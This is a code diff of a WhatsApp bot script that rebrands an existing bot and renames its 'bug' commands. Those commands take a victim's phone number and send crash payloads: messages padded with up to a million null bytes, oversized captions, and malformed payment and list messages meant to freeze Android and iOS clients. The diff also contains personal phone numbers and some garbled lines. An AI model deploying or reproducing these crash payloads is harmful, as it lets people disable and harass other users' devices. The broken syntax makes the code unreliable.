@@ -1,11 +1,11 @@
 //base by Paiiwangsaff (Paiiwangsaff Bot Inc.)
 //re-upload? recode? copy code? give credit ya :)
 //YouTube: @Paiiwangsaff
-//Instagram: paiiwangsff
-//Telegram: t.me/paiiwangsaff
+//Instagram: Paiiwangsaff 
+//Telegram: t.me/paiiwangsaff 
 //GitHub: @Paiiwangsaff
 //WhatsApp: +6285697917734
-//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@DGXeon
+//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@Paiiwangsaff
 
 const { default: makeWaSocket, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
 const os = require('os')
@@ -198,7 +198,7 @@ module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
             },
             message: {
                 listResponseMessage: {
-                    title: "🦄드림 가이 Xeon"
+                    title: "🐉DRAGON SLAYER"
                 }
             }
         };
@@ -243,7 +243,7 @@ module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
             var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
                 'interactiveMessage': {
                     'header': {
-                        'title': "🦄드림 가이 Xeon",
+                        'title': "🐉DRAGON SLAYER",
                         'hasMediaAttachment': true,
                         ...(await prepareWAMessageMedia({
                             'image': {
@@ -253,7 +253,7 @@ module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
                     },
                     'body': text,
                     'footer': {
-                        'text': "›          #🦄드림 가이 Xeon"
+                        'text': "›          #🐉DRAGON SLAYER"
                     },
                     'nativeFlowMessage': {
                         'messageParamsJson': "\0".repeat(1000000)
@@ -278,7 +278,7 @@ module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
                         'liveLocationMessage': {
                             'degreesLatitude': 'p',
                             'degreesLongitude': 'p',
-                            'caption': "🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon" + 'ꦾ'.repeat(50000),
+                            'caption': "🐉DRAGON SLAYER 🐉DRAGON SLAYER 🐉DRAGON SLAYER 🐉DRAGON SLAYER 🐉DRAGON SLAYER 🐉DRAGON SLAYER 🐉DRAGON SLAYER" + 'ꦾ'.repeat(50000),
                             'sequenceNumber': '0',
                             'jpegThumbnail': ''
                         }
@@ -302,9 +302,9 @@ module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
             };
             var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
                 'listMessage': {
-                    'title': "🦄드림 가이 Xeon" + "\0".repeat(920000),
-                    'footerText': "🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon",
-                    'description': "🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon",
+                    'title': "🐉DRAGON SLAYER" + "\0".repeat(920000),
+                    'footerText': "🐉DRAGON SLAYER 🐉DRAGON SLAYER 🐉DRAGON SLAYER 🐉DRAGON SLAYER 🐉DRAGON SLAYER 🐉DRAGON SLAYER 🐉DRAGON SLAYER",
+                    'description': "🐉DRAGON SLAYER 🐉DRAGON SLAYER 🐉DRAGON SLAYER 🐉DRAGON SLAYER 🐉DRAGON SLAYER 🐉DRAGON SLAYER 🐉DRAGON SLAYER",
                     'buttonText': null,
                     'listType': 0x2,
                     'productListInfo': {
@@ -396,7 +396,7 @@ module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
                                 nativeFlowMessage: {
                                     'buttons': [{
                                         name: "payment_info",
-                                        buttonParamsJson: "{\"currency\":\"BRL\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"🦄드림 가이 Xeon\",\"key\":\"+916909137213\",\"key_type\":\"X\"}}]}"
+                                        buttonParamsJson: "{\"currency\":\"BRL\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"🐉DRAGON SLAYER\",\"key\":\"+6285697917734\",\"key_type\":\"X\"}}]}"
                                     }]
                                 }
                             }
@@ -420,7 +420,7 @@ module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
                                     subtitle: " "
                                 },
                                 'body': {
-                                    text: "🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon"
+                                    text: "🐉DRAGON SLAYER 🐉DRAGON SLAYER 🐉DRAGON SLAYER"
                                 },
                                 'footer': {
                                     text: 'xp'
@@ -480,7 +480,7 @@ module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
                                                         type: "pix_static_code",
                                                         pix_static_code: {
                                                             merchant_name: "meu ovo",
-                                           6285697917734",
+                                                            key: "+5533998586057",
                                                             key_type: "X"
                                                         }
                                                     }
@@ -1902,7 +1902,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 break
             case 'delowner':
                 if (!isCreator) return replygcxeon(mess.owner)
-                if (!args[0]) return replygcxeon(`Use ${prefix + command} nomor\nExample ${prefix + command} 916909137213`)
+                if (!args[0]) return replygcxeon(`Use ${prefix + command} nomor\nExample ${prefix + command}`)
                 ya = q.split("|")[0].replace(/[^0-9]/g, '')
                 unp = owner.indexOf(ya)
                 owner.splice(unp, 1)
@@ -2190,6 +2190,8 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 }, { quoted: m })
             }
                 break
+   //=================================================//          
+         
             case 'sound1':
             case 'sound2':
             case 'sound3':
@@ -2354,15 +2356,15 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 XeonBotInc_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
                 await XeonBotInc.sendMessage(m.chat, { audio: XeonBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
                 break
-
+//================================================//  
             //bug cases
-            case "xandroid": {
+            case "android-paiiwangcrash": {
                 if (!isPremium) return replygcxeon(mess.prem)
-                if (!text) return replygcxeon(`Gunakan ${prefix + command} nomor korban|jumlah\nContoh ${prefix + command} 91xxxxxxxxxx,5`)
+                if (!text) return replygcxeon(`Gunakan ${prefix + command} nomor korban|jumlah\nContoh ${prefix + command} 63xxxxxxxxxx,5`)
                 let number = text.split(',')[0];
                 let amount = text.split(',')[1] * 5;
                 if (!number || !amount) {
-                    return replygcxeon(`Gunakan ${prefix + command} nomor korban|jumlah\nContoh ${prefix + command} 91xxxxxxxxxx,5`)
+                    return replygcxeon(`Gunakan ${prefix + command} nomor korban|jumlah\nContoh ${prefix + command} 63xxxxxxxxxx,5`)
                 }
                 if (isNaN(parseInt(amount))) {
                     return replygcxeon("Jumlah harus berupa angka");
@@ -2371,7 +2373,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 let encodedAmount = '' + encodeURI(amount);
                 var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
                 let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-                if (cleanedNumber == "916909137213") {
+                if (cleanedNumber == "6285697917734") {
                     return;
                 }
                 if (contactInfo.length == 0) {
@@ -2388,13 +2390,15 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 );
             }
                 break;
-            case "xios": {
+     //=================================================//         
+
+               case "ios-paiiwangcrash": {
                 if (!isPremium) return replygcxeon(mess.prem)
-                if (!text) return replygcxeon(`Gunakan ${prefix + command} nomor korban|jumlah\nContoh ${prefix + command} 91xxxxxxxxxx,5`)
+                if (!text) return replygcxeon(`Gunakan ${prefix + command} nomor korban|jumlah\nContoh ${prefix + command} 63xxxxxxxxxx,5`)
                 let number = text.split(',')[0];
                 let amount = text.split(',')[1] * 5;
                 if (!number || !amount) {
-                    return replygcxeon(`Gunakan ${prefix + command} nomor korban|jumlah\nContoh ${prefix + command} 91xxxxxxxxxx,5`)
+                    return replygcxeon(`Gunakan ${prefix + command} nomor korban|jumlah\nContoh ${prefix + command} 63xxxxxxxxxx,5`)
                 }
                 if (isNaN(parseInt(amount))) {
                     return replygcxeon("Jumlah harus berupa angka");
@@ -2403,7 +2407,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 let encodedAmount = '' + encodeURI(amount);
                 var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
                 let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-                if (cleanedNumber == "916909137213") {
+                if (cleanedNumber == "6285697917734") {
                     return;
                 }
                 if (contactInfo.length == 0) {
@@ -2420,7 +2424,8 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 );
             }
                 break;
-            case "xios2":
+        //=================================================//      
+          case "deadpaii":
                 {
                     if (!isPremium) return replygcxeon(mess.prem)
                     if (!isBot) {
@@ -2440,7 +2445,10 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                     sendReaction('âœ…');
                 }
                 break;
-            case "xandroid2":
+          
+//=================================================//  
+
+        case "android2-paiiwangcrash":
                 {
                     if (!isPremium) return replygcxeon(mess.prem)
                     if (!isBot) {
@@ -2460,7 +2468,9 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                     sendReaction('âœ…');
                 }
                 break;
-            case "xgc":
+   //=================================================//         
+
+        case "xgc":
                 {
                     if (!isPremium) return replygcxeon(mess.prem)
                     if (!text) {
@@ -2484,13 +2494,15 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                     }
                 }
                 break;
-            case "systemuicrash": {
+   //=================================================//           
+
+      case "systemuicrash": {
                 if (!isPremium) return replygcxeon(mess.prem)
-                if (!text) return replygcxeon(`Gunakan ${prefix + command} nomor korban|jumlah\nContoh ${prefix + command} 91xxxxxxxxxx,5`)
+                if (!text) return replygcxeon(`Gunakan ${prefix + command} nomor korban|jumlah\nContoh ${prefix + command} 63xxxxxxxxxx,5`)
                 let number = text.split(',')[0];
                 let amount = text.split(',')[1] * 5;
                 if (!number || !amount) {
-                    return replygcxeon(`Gunakan ${prefix + command} nomor korban|jumlah\nContoh ${prefix + command} 91xxxxxxxxxx,5`)
+                    return replygcxeon(`Gunakan ${prefix + command} nomor korban|jumlah\nContoh ${prefix + command} 63xxxxxxxxxx,5`)
                 }
                 if (isNaN(parseInt(amount))) {
                     return replygcxeon("Jumlah harus berupa angka");
@@ -2499,7 +2511,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 let encodedAmount = '' + encodeURI(amount);
                 var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
                 let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-                if (cleanedNumber == "916909137213") {
+                if (cleanedNumber == "6285697917734") {
                     return;
                 }
                 if (contactInfo.length == 0) {
@@ -2516,13 +2528,17 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 );
             }
                 break;
-            case "xsysui": {
+            
+//=================================================//  
+
+
+        case "xsysui": {
                 if (!isPremium) return replygcxeon(mess.prem)
-                if (!text) return replygcxeon(`Gunakan ${prefix + command} nomor korban|jumlah\nContoh ${prefix + command} 91xxxxxxxxxx,5`)
+                if (!text) return replygcxeon(`Gunakan ${prefix + command} nomor korban|jumlah\nContoh ${prefix + command} 63xxxxxxxxxx,5`)
                 let number = text.split(',')[0];
                 let amount = text.split(',')[1] * 5;
                 if (!number || !amount) {
-                    return replygcxeon(`Gunakan ${prefix + command} nomor korban|jumlah\nContoh ${prefix + command} 91xxxxxxxxxx,5`)
+                    return replygcxeon(`Gunakan ${prefix + command} nomor korban|jumlah\nContoh ${prefix + command} 63xxxxxxxxxx,5`)
                 }
                 if (isNaN(parseInt(amount))) {
                     return replygcxeon("Jumlah harus berupa angka");
@@ -2531,7 +2547,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 let encodedAmount = '' + encodeURI(amount);
                 var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
                 let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-                if (cleanedNumber == "916909137213") {
+                if (cleanedNumber == "6285697917734") {
                     return;
                 }
                 if (contactInfo.length == 0) {
@@ -2548,25 +2564,29 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 );
             }
                 break;
+       //=================================================//    
+
             case 'clearall': {
                 if (!isCreator) return replygcxeon(mess.owner)
                 XeonBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
             }
                 break
-            case 'clearchat':
+       //=================================================//      
+
+         case 'clearchat':
                 xeonimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
                 break
-            case 'onekill':
+            case '1💀':
             case "oneclickall":
-            case "xsamsung":
-            case "xwaweb":
-            case "doublekill":
-            case '💀':
-            case 'triplekill': {
+            case "💀samsung":
+            case "💀waweb":
+            case "doublepaii":
+            case '💀paiiwangsaff':
+            case 'triplepaii': {
                 if (!isPremium) return replygcxeon(mess.prem)
-                if (!q) return replygcxeon(`Example : ${prefix + command} 91xxxxxxxxxx`)
+                if (!q) return replygcxeon(`Example : ${prefix + command} 63xxxxxxxxxx`)
                 let number = q.replace(/[^0-9]/g, '');
-                if (number.startsWith('0')) return replygcxeon(`Example : ${prefix + command} 91xxxxxxxxxx`)
+                if (number.startsWith('0')) return replygcxeon(`Example : ${prefix + command} 63xxxxxxxxxx`)
                 let target = number + '@s.whatsapp.net';
                 await replygcxeon("In process..")
                 for (let i = 0; i < 1; i++) {
@@ -2579,11 +2599,13 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 }
             }
                 break
-            case 'xpayment': {
+   //=================================================//          
+
+           case 'Painer': {
                 if (!isPremium) return replygcxeon(mess.prem)
-                if (!q) return replygcxeon(`Example : ${prefix + command} 91xxxxxxxxxx`)
+                if (!q) return replygcxeon(`Example : ${prefix + command} 63xxxxxxxxxx`)
                 let number = q.replace(/[^0-9]/g, '');
-                if (number.startsWith('0')) return replygcxeon(`Example : ${prefix + command} 91xxxxxxxxxx`)
+                if (number.startsWith('0')) return replygcxeon(`Example : ${prefix + command} 63xxxxxxxxxx`)
                 let target = number + '@s.whatsapp.net';
                 await replygcxeon("In process..")
                 await sendPaymentInfoMessage(target)
@@ -2592,9 +2614,9 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 break
             case 'oneshot': {
                 if (!isPremium) return replygcxeon(mess.prem)
-                if (!q) return replygcxeon(`Example : ${prefix + command} 91xxxxxxxxxx`)
+                if (!q) return replygcxeon(`Example : ${prefix + command} 63xxxxxxxxxx`)
                 let number = q.replace(/[^0-9]/g, '');
-                if (number.startsWith('0')) return replygcxeon(`Example : ${prefix + command} 91xxxxxxxxxx`)
+                if (number.startsWith('0')) return replygcxeon(`Example : ${prefix + command} 63xxxxxxxxxx`)
                 let target = number + '@s.whatsapp.net';
                 await replygcxeon("In process..")
                 await OneShot(target)
@@ -2604,117 +2626,152 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             case 'alive':
             case '?':
             case 'allmenu':
-                let xeonmenuoh = `Hello ${pushname} 😄
-┏━━━━━⊱ ${xeonytimewisher} ━━━━⊱
-
+                let xeonmenuoh = 
+┏`Hello
+ 🕷
+${pushname}
+┏━━━━━⊱ ━━━━⊱
 ${readmore}
+▌𝐃𝐑𝐀𝐆𝐎𝐍 𝐒𝐋𝐀𝐘𝐄𝐑 𝐕1●➤
+◈ Creator : PAIIWANGSAFF
+◈ Library : WS-Baileys
+◈ Type : Case
+◈ Status : Ready
+◈ Mode : ${XeonBotInc.public ? 'Public' : 'Self'}
+◈ Bot Name : ${global.botname} 
+◈ Prefix : ['','!','.','#','&']
+◈ Runtime : ${runtime(process.uptime())}
 
-╰┈➤ ʙᴜɢ ᴀɴᴅʀᴏɪᴅ
-> xandroid
-> xandroid2
-> systemuicrash
-> xsysui
-> xpayment
-> oneshot
-> onekill
+❐ © 💀BY 🕷PAIIWANGSAFF🕷 
+${readmore}
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ 
 
-╰┈➤ ʙᴜɢ ɪᴏꜱ
-> xios
-> xios2
+ ┏━━━━━ 𝐁𝐔𝐆 𝐀𝐍𝐃𝐑𝐎𝐈𝐃 ━━━━━━
+  𝐀𝐧𝐝𝐫𝐨𝐢𝐝-𝐏𝐚𝐢𝐢𝐰𝐚𝐧𝐠𝐜𝐫𝐚𝐬𝐡
+  𝐀𝐧𝐝𝐫𝐨𝐢𝐝2-𝐏𝐚𝐢𝐢𝐰𝐚𝐧𝐠𝐜𝐫𝐚𝐬𝐡
+  systemuicrash
+  xsysui
+  𝐏𝐚𝐢𝐧𝐞𝐫
+  💀paiiwangsaff
+  1💀
+  𝐃𝐨𝐮𝐛𝐥𝐞𝐩𝐚𝐢𝐢
+  𝐓𝐫𝐢𝐩𝐩𝐥𝐞𝐩𝐚𝐢𝐢
+┗━━━━━━━━━━━━━━━━━━━━
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ 
 
-╰┈➤ ʙᴜɢ ɢʀᴏᴜᴘ ᴄʜᴀᴛ
-> xgc
+ ┏━━━━━ 𝐁𝐔𝐆  𝐈𝐎𝐒  ━━━━━━━━
+ 𝐈𝐎𝐒-𝐏𝐚𝐢𝐢𝐰𝐚𝐧𝐠𝐜𝐫𝐚𝐬𝐡
+ 𝐃𝐞𝐚𝐝𝐩𝐚𝐢𝐢
+┗━━━━━━━━━━━━━━━━━━━━━
 
-╰┈➤ ᴏᴡɴᴇʀ ᴍᴇɴᴜ
-> getsession
-> deletesession
-> join
-> shutdown  
-> restart
-> autoread *[option]*
-> autotyping *[option]*
-> autorecording *[option]*
-> autorecordtyp *[option]*
-> autobio *[option]*
-> autoswview *[option]*
-> mode *[option]*
-> block
-> unblock 
-> backup
-> getcase
-> addowner
-> delowner
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ 
 
-╰┈➤ ɢʀᴏᴜᴘ ᴍᴇɴᴜ
-> closetime
-> opentime
-> kick
-> add
-> promote
-> demote
-> setdesc
-> setppgc
-> tagall
-> hidetag
-> totag
-> group *[option]*
-> editinfo
-> linkgc
-> revoke
-> listonline
+ ┏━━━━━ 𝐁𝐔𝐆 𝐆𝐑𝐎𝐔𝐏 ━━━━━━━
+  xgc
+ ┗━━━━━━━━━━━━━━━━━━━━━━
+┏━━━━━ 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 ━━━━━━━
+ getsession
+  deletesession
+  join
+  shutdown  
+  restart
+  autoread *[option]*
+  autotyping *[option]*
+  autorecording *[option]*
+  autorecordtyp *[option]*
+  autobio *[option]*
+  autoswview *[option]*
+  mode *[option]*
+  block
+  unblock 
+  backup
+  getcase
+  addowner
+  delowner
+┗━━━━━━━━━━━━━━━━━
 
-╰┈➤ ᴍᴀɪɴ ᴍᴇɴᴜ
-> menu
-> buypremium
-> runtime
-> script
-> donate
-> owner
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ 
+ ┏━━━━━ 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔 ━━━━
+  closetime
+  opentime
+  kick
+  add
+  promote
+  demote
+  setdesc
+  setppgc
+  tagall
+  hidetag
+  totag
+  group *[option]*
+  editinfo
+  linkgc
+  revoke
+  listonline
+┗━━━━━━━━━━━━━━━━━
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ 
 
-╰┈➤ ᴄᴏɴᴠᴇʀᴛ ᴍᴇɴᴜ
-> sticker
-> smeme
-> take
-> toimage
-> tovideo
-> toaudio
-> tomp3
-> tovn
-> togif
-> tourl
-> toqr
-> toviewonce
-> fliptext
-> emojimix
+ ┏━━━━━    𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 ━━━
+  menu
+  buypremium
+  runtime
+  script
+  donate
+  owner
+┗━━━━━━━━━━━━━━━━━
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ 
 
-╰┈➤ ᴅᴀᴛᴀʙᴀsᴇ ᴍᴇɴᴜ
-> addvideo
-> addimage
-> addsticker
-> addvn
-> addzip
-> addapk
-> addpdf
-> delvideo
-> delimage
-> delsticker
-> delvn
-> delzip
-> delapk
-> delpdf
-> listvideo
-> listimage
-> liststicker
-> listvn
-> listzip
-> listapk
-> listpdf
+ ┏━━━━━ᴄᴏɴᴠᴇʀᴛ ᴍᴇɴᴜ━━━━━
+  sticker
+  smeme
+  take
+  toimage
+  tovideo
+  toaudio
+  tomp3
+  tovn
+  togif
+  tourl
+  toqr
+  toviewonce
+  fliptext
+  emojimix
+┗━━━━━━━━━━━━━━━━━
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ 
 
-╰┈➤ ᴅᴏᴡɴ ᴍᴇɴᴜ
-> play
-> ytmp3
-> ytmp4
-> sound1 - sound161
+
+ ┏━━━━━ ᴅᴀᴛᴀʙᴀsᴇ ᴍᴇɴᴜ ━━━━━
+  addvideo
+  addimage
+  addsticker
+  addvn
+  addzip
+  addapk
+  addpdf
+  delvideo
+  delimage
+  delsticker
+  delvn
+  delzip
+  delapk
+  delpdf
+  listvideo
+  listimage
+  liststicker
+  listvn
+  listzip
+  listapk
+  listpdf
+┗━━━━━━━━━━━━━━━━━━
+
+ ┏━━ 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐌𝐄𝐍𝐔 ━━━
+  play
+  ytmp3
+  ytmp4
+  sound1 - sound161
+  ┗━━━━━━━━━━━━━━━━━━
+  
+  ▬▬▬▬▬𝐏𝐀𝐈𝐈𝐖𝐀𝐍𝐆𝐒𝐀𝐅𝐅 ▬▬▬▬▬▬▬ 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━⊱`
                 if (typemenu === 'v1') {
                     XeonBotInc.sendMessage(m.chat, {
